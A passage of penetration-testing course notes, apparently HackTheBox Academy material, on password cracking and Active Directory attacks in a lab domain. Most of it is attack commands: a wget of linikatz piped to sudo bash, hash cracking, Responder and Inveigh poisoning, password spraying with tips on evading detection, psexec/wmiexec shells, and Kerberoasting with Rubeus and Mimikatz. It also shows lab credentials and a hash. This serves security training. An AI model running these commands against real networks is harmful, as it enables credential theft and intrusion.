Setup (when attack host isn't domain-joined):

# Edit /etc/hosts to map DC name to IP
echo "172.16.1.10 inlanefreight.htb dc01.inlanefreight.htb dc01" >> /etc/hosts

# Configure proxychains for socks5
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# Set the ccache file
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

Use Impacket via proxychains:

proxychains impacket-wmiexec dc01 -k
proxychains impacket-psexec dc01 -k

Use Evil-WinRM with Kerberos:

# Install Kerberos auth package
sudo apt-get install krb5-user -y
# Set realm to: INLANEFREIGHT.HTB, KDC to DC01

# Connect
proxychains evil-winrm -i dc01 -r inlanefreight.htb

Convert Between ccache and kirbi

# ccache (Linux) → kirbi (Windows)
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# Import kirbi on Windows with Rubeus
Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

Linikatz — Mimikatz for Linux AD

Tool: Linikatz — Extract credentials from Linux AD integration (FreeIPA, SSSD, Samba)
GitHub: https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
Requires: root

wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
sudo bash /opt/linikatz.sh

15. Cracking Protected Files & Archives

Encrypted SSH Keys

# SSH key with "ENCRYPTED" in header requires a passphrase
cat SSH.private
# -----BEGIN RSA PRIVATE KEY-----
# Proc-Type: 4,ENCRYPTED    ← this means it's protected

# Convert to john-crackable hash
python3 ssh2john.py SSH.private > ssh.hash

# Crack
john --wordlist=rockyou.txt ssh.hash

# Show result
john ssh.hash --show

Password-Protected Office Documents

# Convert to hash
office2john.py Protected.docx > protected-docx.hash

# Crack with John
john --wordlist=rockyou.txt protected-docx.hash

# Show cracked password
john protected-docx.hash --show

Password-Protected PDFs

pdf2john.pl PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show

ZIP Archives

zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
john zip.hash --show

RAR Archives

rar2john RAR.rar > rar.hash
john --wordlist=rockyou.txt rar.hash

BitLocker Encrypted Drives

# Extract hash from VHD
bitlocker2john -i Backup.vhd > backup.hashes

# Filter for the password hash (type 0)
grep "bitlocker\$0" backup.hashes > backup.hash

# Crack with Hashcat (-m 22100 = BitLocker)
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked

OpenSSL Encrypted Archives (GZIP)

# Identify file type
file GZIP.gzip
# Output: openssl enc'd data with salted password

# Brute-force decrypt using for-loop
for i in $(cat rockyou.txt); do
    openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz
done
# When correct password is found, files will extract silently

Hunting for Encrypted Files

# Search for common document types
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*"); do
    echo -e "\nFile extension: " $ext
    find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core"
done

# Download list of all archive/compressed file extensions from FileInfo
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

Hashcat — Cracking Specific Hash Types

# NTLM (Windows passwords)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Linux SHA-512 shadow hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o cracked.txt

# Linux MD5 shadow hashes
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt

# BitLocker
hashcat -m 22100 backup.hash rockyou.txt -o backup.cracked

16. Password Policies & Password Managers

Industry Standards for Password Policies

  • NIST SP800-63B — https://pages.nist.gov/800-63-3/sp800-63b.html
  • CIS Password Policy Guide — https://www.cisecurity.org/
  • PCI DSS — for payment card environments

Good Password Policy Elements

  • Minimum 8 characters
  • Uppercase + lowercase letters
  • At least one number
  • At least one special character
  • Not the username
  • Changed every 60 days (debate ongoing — see NIST)
  • Blacklist: company name, common words, months, seasons, variations of "password/welcome"

Password Managers

Online (cloud sync):
- 1Password, Bitwarden, Dashlane, Keeper, Lastpass, NordPass, RoboForm

Local (offline database):
- KeePass (most common in enterprise; .kdbx files — a great target!)
- KWalletManager, Pleasant Password Server, Password Safe

Key features to look for:
- 2FA support, Multi-platform, Browser extension, Import/export, Password generation

Passwordless Authentication Methods

  • FIDO2 — hardware keys like YubiKey
  • OTP — one-time passwords
  • TOTP — time-based OTP (Google Authenticator)
  • MFA — multi-factor authentication
  • Device Compliance — Endpoint Manager / Workspace ONE

Active Directory/Module 13

Active Directory Enumeration & Attacks

🔰 Introduction & Why AD Matters

Active Directory (AD) is Microsoft's directory service, officially released with Windows Server 2000, built on top of x.500 and LDAP protocols. It provides:
- Authentication — Who are you?
- Authorization — What can you access?
- Accounting — What did you do?

As of writing, AD holds ~43% market share in enterprise Identity & Access Management (IAM) solutions. Microsoft has reported 2000+ CVEs tied to AD in just the last two years, making it a very high-value attack surface.

Why It Gets Compromised

  • Misconfigured services and permissions
  • Legacy configurations carried through upgrades
  • Overly permissive ACLs and trusts
  • Weak passwords + password spraying vulnerability

Our Goal

Enumerate, then escalate. We move laterally (same privilege level, different machines) or vertically (higher privilege) through the environment until we reach Domain Admin or accomplish the assessment objective.

💡 Key mindset: Understand why flaws exist, not just how to exploit them. This makes you a better attacker and enables you to give clients sound remediation advice.

Lab Access

# Connect to Windows attack host (MS01)
xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!

# Connect to Linux attack host via SSH
ssh htb-student@<ATTACK01 target IP>

# Connect to Linux attack host via RDP (for BloodHound GUI)
xfreerdp /v:<ATTACK01 target IP> /u:htb-student /p:HTB_@cademy_stdnt!
  • Windows tools: C:\Tools\
  • Linux tools: /opt/ or in PATH

🎯 Assessment Scenario & Scope

We simulate an internal penetration test for Inlanefreight as CAT-5 Security.

In-Scope Targets

Range/Domain Description
INLANEFREIGHT.LOCAL Primary customer domain
LOGISTICS.INLANEFREIGHT.LOCAL Customer subdomain
FREIGHTLOGISTICS.LOCAL Subsidiary — external forest trust with INLANEFREIGHT.LOCAL
172.16.5.0/23 Internal subnet

Out of Scope

  • Any other subdomains not listed
  • Phishing or social engineering
  • The real-world inlanefreight.com website (except passive enumeration)

🌐 External Reconnaissance (OSINT)

Before touching the target network, gather intelligence passively. This validates scope, finds leaked credentials, and maps the target's footprint.

What We're Looking For

Data Point Where to Find It
IP address blocks / ASN BGP Toolkit by Hurricane Electric
DNS records / subdomains viewdns.info, domaintools.com
Email naming convention Company website, LinkedIn, Google dorks
Technology stack Job postings, LinkedIn, Shodan
Exposed documents Google: filetype:pdf inurl:inlanefreight.com
Leaked credentials Dehashed, HaveIBeenPwned
Email addresses Google: intext:"@inlanefreight.com" inurl:inlanefreight.com

Key Commands

# Validate nameservers and resolve to IP
nslookup ns1.inlanefreight.com
# → Confirms IP address is consistent with scoping document
# → Reveals nameserver infrastructure
# NEXT: Add discovered IPs to your target list for further validation

# Query Dehashed for leaked credentials in your target domain
sudo python3 dehashed.py -q inlanefreight.local -p
# → Returns: email, username, cleartext password, hashed_password, database source
# NEXT: Test any found credentials against VPN, OWA, or domain login pages

💡 Why OSINT first? You might find an email naming convention (e.g., first.last@company.com) that lets you build a valid username list before touching the internal network. You may also find leaked credentials that give you an immediate foothold.

🔎 Initial Internal Enumeration

Once inside the network (or with access to the internal subnet), start identifying live hosts and services.

Network Discovery

# Start passive packet capture — observe what's happening on the wire
sudo tcpdump -i ens224
# → Look for: broadcasts, LLMNR queries, DNS traffic, SMB, Kerberos traffic
# → Reveals: active hosts, domain name, naming conventions
# NEXT: Note any LLMNR/NBT-NS queries — these are targets for Responder

# Run Responder in PASSIVE/Analysis mode (listen only, don't poison yet)
sudo responder -I ens224 -A
# → Responder tool: captures and displays LLMNR, NBT-NS, MDNS requests
# → -A flag = Analysis mode (passive — does NOT respond to queries)
# → -I = specify interface
# NEXT: Note what hosts are broadcasting — this tells you what's alive

# Ping sweep — find live hosts quickly
fping -asgq 172.16.5.0/23
# → -a = show alive hosts | -s = print stats | -g = generate target list | -q = quiet (no per-host output)
# → Faster than nmap for initial host discovery
# NEXT: Feed the alive host list to nmap for deeper scanning

# Full nmap scan against discovered hosts
sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum
# → -v = verbose | -A = OS detect + version detect + script scan + traceroute
# → -iL = input from file (your live hosts list)
# → -oN = normal output to file
# → Look for: open ports (445/SMB, 389/LDAP, 88/Kerberos, 3389/RDP, 5985/WinRM)
# → Kerberos port 88 = likely Domain Controller
# NEXT: Identify Domain Controllers and start targeting them for further enumeration

Username Enumeration with Kerbrute

Kerbrute uses Kerberos Pre-Authentication to validate usernames without triggering account lockouts (it only fails on bad usernames, not bad passwords — no lockout for username enum).

# Clone and build Kerbrute
sudo git clone https://github.com/ropnop/kerbrute.git
# → Downloads the Go source code
cd kerbrute
make help          # See compilation options
sudo make all      # Compile for all platforms (Linux, Windows, macOS)

# Move to PATH for easy use
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Test the binary
./kerbrute_linux_amd64

# Enumerate valid usernames against the domain
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
# → userenum = username enumeration mode
# → -d = target domain
# → --dc = domain controller IP
# → jsmith.txt = wordlist of possible usernames (use /opt/jsmith.txt or similar)
# → -o = output valid usernames to file
# → Returns: [+] VALID USERNAME: [email protected]
# NEXT: Use the valid username list for password spraying

💡 Why Kerbrute for user enum? Standard authentication failures generate Event ID 4625. Kerbrute's Kerberos-based enum generates 4768 (AS-REQ) only for valid accounts, making it stealthier and avoiding account lockout.

🔗 Resources: Username wordlists — jsmith.txt and jsmith2.txt from Statistically Likely Usernames

☠️ LLMNR & NBT-NS Poisoning (Linux)

How It Works

LLMNR (Link-Local Multicast Name Resolution, port 5355/UDP) and NBT-NS (NetBIOS Name Service, port 137/UDP) are fallback name resolution protocols used when DNS fails.

Attack flow:
1. A Windows host tries to access \\printer01.inlanefreight.local but DNS fails (typo, missing record)
2. The host broadcasts to the entire subnet: "Does anyone know where printer01 is?"
3. Responder (our tool) responds: "Yes! That's me!"
4. The Windows host believes the reply and sends an NTLMv2 authentication request (username + password hash)
5. We capture the hash and crack it offline

What we get: NTLMv1/v2 hashes — crack them to get plaintext passwords, or use for SMB relay attacks.

⚠️ Important: NetNTLMv2 hashes cannot be used for pass-the-hash attacks directly. They must be cracked first.

Responder — Linux

Responder poisons LLMNR, NBT-NS, and MDNS and serves fake authentication services.

Supported protocols for capturing hashes: LLMNR, DNS, MDNS, NBNS, DHCP, ICMP, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth, MSSQL, DCE-RPC, FTP, POP3, IMAP, SMTP

# View all Responder options
responder -h
# → See all flags and functionality

# Run Responder in full poisoning mode (most common usage)
sudo responder -I ens224
# → -I = network interface to listen on
# → Starts poisoning LLMNR/NBT-NS/MDNS and capturing hashes
# → Hashes saved to: /usr/share/responder/logs/
# → Log format: SMB-NTLMv2-SSP-172.16.5.25.txt
# → Also stored in SQLite DB at /usr/share/responder/
# NEXT: Let Responder run in a tmux window while you do other enumeration

# Run in a tmux window and leave running
tmux new -s responder
sudo responder -I ens224
# Ctrl+B then D to detach

Common Responder flags:
| Flag | Purpose |
|------|---------|
| -I | Specify network interface |
| -A | Analysis/passive mode (listen only, don't poison) |
| -w | Start WPAD rogue proxy server (captures HTTP from IE with auto-detect) |
| -f | Fingerprint the OS/version of querying hosts |
| -v | Verbose mode |
| -F | Force NTLM auth on WPAD (use carefully — may cause login prompts) |
| --lm | Force LM hashing downgrade |

Cracking Captured Hashes

# Crack NTLMv2 hash with Hashcat
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
# → -m 5600 = NTLMv2 hash mode
# → forend_ntlmv2 = file containing the captured hash (from Responder logs)
# → /usr/share/wordlists/rockyou.txt = wordlist
# → If cracked: shows FOREND::INLANEFREIGHT:<hash>:Klmcargo2 (username:password)
# NEXT: Use the cracked credentials for credentialed enumeration

💡 Hash mode reference: Hashcat Example Hashes — use this to identify unknown hash types

🔗 Hashcat modes: NTLMv1 = -m 5500, NTLMv2 = -m 5600, Kerberos TGS = -m 13100

🪟 LLMNR & NBT-NS Poisoning (Windows — Inveigh)

Inveigh is a PowerShell/C# tool that functions like Responder but runs on Windows hosts. Useful when you've compromised a Windows machine and want to capture hashes from that vantage point.

Inveigh supports: LLMNR, DNS, mDNS, NBNS, DHCPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth

# Import the PowerShell version
Import-Module .\Inveigh.ps1

# View available parameters
(Get-Command Invoke-Inveigh).Parameters
# → Shows all options: LLMNR, NBNS, ConsoleOutput, FileOutput, etc.
# NEXT: Review parameters to configure what to capture

# Run Inveigh with LLMNR and NBNS spoofing, console + file output
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# → Y = enabled for LLMNR spoofing
# → -NBNS Y = also spoof NBNS
# → -ConsoleOutput Y = show captures in console
# → -FileOutput Y = write to disk
# → Watch for captured hashes in console output
# NEXT: Crack hashes with Hashcat (same as Linux)

# Use C# version (InveighZero) — more feature-rich
.\Inveigh.exe
# → Compiled C# version, more stable and feature-complete
# → Press ESC for interactive console
# → Type HELP to see commands
# → GET NTLMV2USERNAMES / GET NTLMV2UNIQUE to view captured data

Mitigations for LLMNR/NBT-NS Attacks

Disable NBT-NS via PowerShell registry edit:

$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
# → Value 2 = Disable NetBIOS over TCP/IP on all interfaces
# → Value 0 = Default (uses DHCP), Value 1 = Enabled

Other mitigations:
- Disable LLMNR via Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → "Turn off multicast name resolution" → Enabled
- Filter network traffic to block LLMNR (UDP 5355) and NBT-NS (UDP 137) traffic
- Enable SMB Signing to prevent relay attacks
- Use network intrusion detection (look for unusual LLMNR/NBNS traffic)

🔑 Password Spraying & Password Policies

Password spraying = try one password against many accounts. This avoids account lockouts by staying within the threshold.

⚠️ CRITICAL: Always enumerate the password policy FIRST. Never spray more than lockout_threshold - 1 attempts per observation window.

Enumerate Password Policy (Linux)

# Via CrackMapExec with valid credentials
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
# → --pass-pol = dump password policy
# → Shows: min length, complexity, lockout threshold, lockout duration
# NEXT: Use this info to determine safe spraying intervals

# Via NULL session with rpcclient (no creds needed)
rpcclient -U "" -N 172.16.5.5
# → -U "" = empty username | -N = no password (NULL session)
# → Opens interactive rpcclient shell
rpcclient $> querydominfo
# → Returns domain info including password policy
# NEXT: Note lockout threshold and duration

# Via enum4linux
enum4linux -P 172.16.5.5
# → -P = password policy only
# → Works via NULL session
# NEXT: Document policy before spraying

# Via enum4linux-ng (improved version, YAML/JSON output)
enum4linux-ng -P 172.16.5.5 -oA ilfreight
# → -oA = output in both YAML and JSON formats
# → Saved as ilfreight.json and ilfreight.yaml
# NEXT: Parse the output programmatically or review manually

# Via ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
# → -h = host | -x = simple auth | -b = search base | -s = scope
# → grep for pwdHistoryLength to find password policy settings
# NEXT: Note pwdHistoryLength (prevents password reuse) and max/min age

Enumerate Password Policy (Windows)

# Built-in net accounts command
net accounts
# → Shows: password minimum age, maximum age, min length, lockout threshold
# → Quick and built-in — no extra tools needed

# Via PowerView
Import-Module .\PowerView.ps1
Get-DomainPolicy
# → Returns full domain password policy
# → Shows fine-grained password policies if any exist

Enumerate Users for Spraying

# Via enum4linux (parse output with grep/cut)
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
# → -U = enumerate users | grep/cut to extract just usernames
# NEXT: Save to file for spraying

# Via rpcclient
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomuser
# → Lists all domain users with their RIDs
# NEXT: Parse output to get username list

# Via CrackMapExec
crackmapexec smb 172.16.5.5 --users
# → Dumps full user list from domain

# Via ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
# → Query for all user objects and extract sAMAccountName
# NEXT: Save list to valid_users.txt

# Via windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
# → -U = enumerate users | -u "" = anonymous bind
# NEXT: Combine with other enumeration methods for comprehensive list

# Generate username combinations from scratch (bash)
#!/bin/bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
do echo $x
done
# → Generates 16,079,616 possible 4-character combos (use with wordlist tools)

Perform Password Spraying (Linux)

# Spray with rpcclient (bash one-liner)
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
# → Tries Welcome1 for each user in valid_users.txt
# → grep Authority filters for successful auth (failed = no output)
# → Run slowly / in batches to avoid lockouts
# NEXT: Any successful auth will show domain\username — use those creds

# Spray with Kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
# → Sprays Welcome1 against all users in valid_users.txt
# → Uses Kerberos (stealthier, generates fewer events than SMB spraying)
# → [+] VALID LOGIN! = success
# NEXT: Use valid credentials for credentialed enumeration

# Spray with CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
# → -u = user file | -p = single password to spray
# → grep + = only show successful logins (CME marks success with [+])
# NEXT: Note any [+] results with Pwn3d! = local admin on that host

# Validate a specific credential pair
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
# → Quick validation that a cred pair works
# NEXT: If valid, proceed to credentialed enumeration

# Spray local accounts across subnet (avoid lockout with --local-auth)
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
# → --local-auth = authenticate locally (not domain auth — avoids domain lockout)
# → -H = use NTLM hash instead of password
# → Only one attempt per host (local auth doesn't lock domain accounts)
# NEXT: Any Pwn3d! = local admin — use for lateral movement

Perform Password Spraying (Windows)

# Import DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1

# Spray against all domain users
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
# → Automatically pulls user list from AD
# → Sprays Welcome1 against all users
# → -OutFile = save successful creds to file
# → -ErrorAction SilentlyContinue = suppress errors
# NEXT: Review spray_success file for valid credentials

Detecting & Evading Password Spraying

  • Event IDs to watch: 4625 (failed logon), 4771 (Kerberos pre-auth fail), 4648 (explicit credential logon)
  • Evade: Spray slowly (1 attempt per 30+ minutes), use Kerberos instead of NTLM, vary source IPs
  • As defender: Enable fine-grained password policies, monitor 4625 in bulk, alert on spray patterns

🔒 Enumerating Security Controls

Before running tools aggressively, understand what security controls are in place.

# Check Windows Defender status
Get-MpComputerStatus
# → Shows: AV enabled/disabled, definitions age, real-time protection status
# → AntivirusEnabled, RealTimeProtectionEnabled, AMProductVersion
# NEXT: If AV is present, use AMSI bypasses or in-memory tools

# Check AppLocker policies (restricts what can execute)
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# → Shows: what's allowed/denied for scripts, executables, installers, DLLs
# → If enforced: may need to use LOLBins or bypass techniques
# NEXT: Look for paths that are whitelisted (C:\Windows\Tasks, C:\Temp, etc.)

# Check PowerShell Language Mode (FullLanguage vs ConstrainedLanguage)
$ExecutionContext.SessionState.LanguageMode
# → FullLanguage = all PowerShell features available
# → ConstrainedLanguage = restricted (limits .NET, COM objects, etc.)
# NEXT: If Constrained, consider using C# tools or native binaries

# LAPS — Local Administrator Password Solution
# LAPS randomizes local admin passwords and stores them in AD
# If you can read LAPS passwords, you get local admin on those machines

# Find groups that have been delegated LAPS read access
Find-LAPSDelegatedGroups
# → Returns: groups with LAPS read permissions
# NEXT: If you control a user in these groups, you can read LAPS passwords

# Check which users/groups can read LAPS extended rights
Find-AdmPwdExtendedRights
# → Returns: computers with LAPS enabled + groups with All Extended Rights
# NEXT: Target those groups — if you can compromise a member, read LAPS passwords

# Find computers with LAPS and retrieve passwords (if you have rights)
Get-LAPSComputers
# → Returns: computer name, LAPS expiration, LAPS password (if readable)
# NEXT: Use LAPS password to authenticate as local admin on that host

🔍 Credentialed Enumeration (Linux)

Once you have valid credentials (from spraying, hash cracking, or other means), enumerate much deeper.

Connect to Target

# RDP into a Windows host
xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25
# → Full GUI access to the target Windows machine
# NEXT: Use as pivot point for further Windows-based enumeration

CrackMapExec (CME)

# Enumerate users with valid creds
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
# → Authenticated user enumeration — gets all domain users
# → More complete than NULL session enumeration
# NEXT: Build comprehensive user list for spraying or targeted attacks

# Enumerate groups
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
# → Lists all domain groups with member counts
# NEXT: Look for non-standard groups — custom groups often have special privileges

# Check who is currently logged in (great for finding admins)
sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users
# → Shows currently logged-on users on the target host
# → If a domain admin is logged in = high-value target for credential dumping
# NEXT: Note hosts where admins are logged in — target for Mimikatz/token impersonation

# Enumerate SMB shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
# → Lists all SMB shares and our access level (READ/WRITE)
# NEXT: Spider readable shares for sensitive files

# Spider shares for readable files (spider_plus module)
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share
# → -M spider_plus = CrackMapExec module to enumerate all readable files
# → --share = specific share to spider (or omit for all)
# → Output in JSON format listing every readable file path
# NEXT: Review for config files, scripts with creds, sensitive documents

SMBMap

# List shares with permissions
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
# → Lists all shares with access level: READ ONLY, READ/WRITE, NO ACCESS
# → -d = domain | -H = host
# NEXT: Focus on shares with READ or WRITE access

# Recursive directory listing of a specific share
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only
# → -R SYSVOL = recursively list SYSVOL share
# → --dir-only = only show directories (faster, less noise)
# → SYSVOL contains GPOs, scripts, and sometimes credential files
# NEXT: Download interesting scripts from SYSVOL — look for hardcoded creds

RPCClient

# Enumerate a specific user by RID
rpcclient $> queryuser 0x457
# → 0x457 = RID in hex
# → Returns full user info: full name, bad pwd count, last logon, etc.
# NEXT: Use this for targeted user investigation

# Enumerate all users
rpcclient $> enumdomusers
# → Returns all users with their RIDs
# NEXT: Cross-reference with other enumeration data

Impacket Tools

# psexec.py — Connect via ADMIN$ share (gets SYSTEM shell)
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
# → Uploads a service binary to ADMIN$, starts it, gives you SYSTEM shell
# → Very noisy — creates a service, writes to disk
# NEXT: Run Mimikatz or dump creds from SYSTEM context

# wmiexec.py — Connect via WMI (semi-interactive shell)
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
# → Uses WMI to run commands — slightly stealthier than psexec
# → Runs as the authenticated user (not SYSTEM)
# NEXT: Run commands, pivot, or dump data

Windapsearch

# Show options
windapsearch.py -h

# Enumerate domain admins group
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da
# → --da = enumerate Domain Admins group
# → Returns all domain admin accounts
# NEXT: These are your highest-value targets

# Find users with nested permissions (privileged users via group nesting)
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU
# → -PU = recursive privileged user search
# → Finds users who are privileged via nested group membership
# NEXT: Target these users — they have elevated privileges you may not see directly

BloodHound (Python)

# Run BloodHound collection from Linux (no domain join required)
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
# → -u/-p = credentials | -ns = nameserver (DC IP)
# → -d = target domain | -c all = collect all data types
# → Creates JSON files: computers.json, users.json, groups.json, acls.json, etc.
# NEXT: Upload JSON files to BloodHound GUI for attack path analysis

# Compress collected data for upload
zip -r ilfreight_bh.zip *.json
# → Bundle all JSON files for BloodHound GUI upload

🪟 Credentialed Enumeration (Windows)

From a Windows host (via RDP or shell on MS01).

PowerView — Core Enumeration

# Import PowerView
Import-Module .\PowerView.ps1

# --- Domain Info ---
Get-Domain              # AD object for current domain
Get-DomainController    # List all domain controllers
Get-DomainPolicy        # Password policy + Kerberos policy

# --- Users ---
Get-DomainUser                                          # All domain users
Get-DomainUser -Identity username                       # Specific user
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName  # SPN users (Kerberoasting targets)

# --- Computers ---
Get-DomainComputer                                      # All computers
Get-DomainComputer -Properties name,operatingsystem     # Filter properties

# --- Groups ---
Get-DomainGroup                                         # All groups
Get-DomainGroup -Identity "Domain Admins"               # Specific group
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # Members (recursive)

# --- OUs & GPOs ---
Get-DomainOU                                            # All OUs
Get-DomainGPO                                           # All Group Policy Objects
Get-DomainGPO | select displayname                      # Just GPO names
Get-DomainPolicy                                        # Default domain policy

🎫 Kerberoasting

Kerberoasting targets service accounts that have a Service Principal Name (SPN) set. Any domain user can request a Kerberos TGS ticket for any SPN. The TGS is encrypted with the service account's NTLM hash — crack it offline to get the plaintext password.

Why It's Dangerous

  • Service accounts often have elevated privileges (Domain Admins, local admins on many hosts)
  • Service account passwords are often set once and never changed
  • The attack requires only a regular domain user account
  • No special rights needed — just being authenticated in the domain

Prerequisites

  • Any valid domain user account (cleartext password or NTLM hash)
  • Domain Controller IP address
  • Impacket or PowerView/Rubeus

Kerberoasting from Linux (Impacket)

# Install Impacket
sudo python3 -m pip install .
# → Run inside cloned impacket directory
# → Installs all tools and adds them to PATH

# View GetUserSPNs options
GetUserSPNs.py -h

# List SPNs (service accounts) in the domain
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday
# → Returns: SamAccountName, ServicePrincipalName, MemberOf, PasswordLastSet
# → Accounts with old password dates = high priority targets
# NEXT: Request TGS tickets for the interesting accounts

# Request ALL TGS tickets for offline cracking
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request
# → -request = pull TGS tickets for all SPNs
# → Returns tickets in Hashcat-crackable format ($krb5tgs$23$...)
# NEXT: Save output and feed to Hashcat

# Request TGS for a SPECIFIC user
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev
# → Only requests the ticket for the sqldev account
# NEXT: Crack this specific ticket

# Request and save to file
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
# → -outputfile = save ticket hash to file
# NEXT: Run Hashcat against the file

# Crack TGS ticket with Hashcat
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
# → -m 13100 = Kerberos TGS-REP etype 23 (RC4) hash mode
# → sqldev_tgs = file with the TGS hash
# → --force = ignore warnings (use in test environments)
# NEXT: If cracked, use credentials to escalate or pivot

Kerberoasting from Windows (Rubeus)

# View Rubeus options
.\Rubeus.exe

# Check kerberoast statistics (accounts, encryption types)
.\Rubeus.exe kerberoast /stats
# → Shows: total SPN accounts, RC4 vs AES encryption breakdown
# → RC4 (type 23) = easier to crack than AES (type 17/18)
# NEXT: Prioritize RC4 accounts for cracking

# Kerberoast privileged accounts only (admincount=1)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
# → /ldapfilter = LDAP filter to target high-value accounts
# → admincount=1 = accounts that have had admin rights (set by AdminSDHolder)
# → /nowrap = don't wrap long hash lines (makes cracking easier)
# NEXT: These are the best targets — crack admin hashes first

# Kerberoast a specific user
.\Rubeus.exe kerberoast /user:testspn /nowrap
# → /user = target specific SPN account
# NEXT: Feed output hash to Hashcat

# Check encryption type (RC4 vs AES) for a specific account
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
# → msds-supportedencryptiontypes: 0 or not set = RC4 (easier to crack)
# → Value 8/24 = AES-256 only = much harder to crack

# Crack the RC4 ticket
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
# NEXT: Use cracked service account credentials

Kerberoasting from Windows (setspn + PowerShell)

# Enumerate SPNs using built-in setspn.exe
setspn.exe -Q */*
# → Lists all SPNs registered in the domain
# → Format: SPN → hosting computer

# Request a single TGS ticket
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRESQL.inlanefreight.local:1433"
# → Requests TGS for the MSSQL SPN
# → Ticket stored in memory (extract with Mimikatz or Rubeus)

# Request ALL TGS tickets
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
# → Requests TGS for every SPN in the domain

# Extract tickets with Mimikatz
mimikatz # base64 /out:true        # Export tickets as base64
mimikatz # kerberos::list /export  # List and export all tickets

Kerberoasting with PowerView

# Find all SPN accounts
